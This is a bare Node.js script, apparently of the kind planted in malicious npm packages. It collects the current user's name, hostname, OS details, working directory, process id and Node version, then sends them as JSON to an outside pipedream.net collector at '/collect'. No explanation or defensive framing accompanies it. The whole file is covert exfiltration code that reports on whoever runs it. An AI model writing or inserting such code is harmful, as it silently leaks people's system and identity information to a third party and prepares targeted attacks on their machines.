const http = require('http');
const os = require('os');
const data = JSON.stringify({
  user: os.userInfo().username,
  hostname: os.hostname(),
  platform: os.platform(),
  release: os.release(),
  arch: os.arch(),
  cwd: process.cwd(),
  pid: process.pid,
  nodeVersion: process.version
});
const req = http.request({
  hostname: 'eosrhixgl4px9ae.m.pipedream.net',
  port: 443,
  path: '/collect',
  method: 'GET',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
}, () => {});
req.write(data);
req.end();
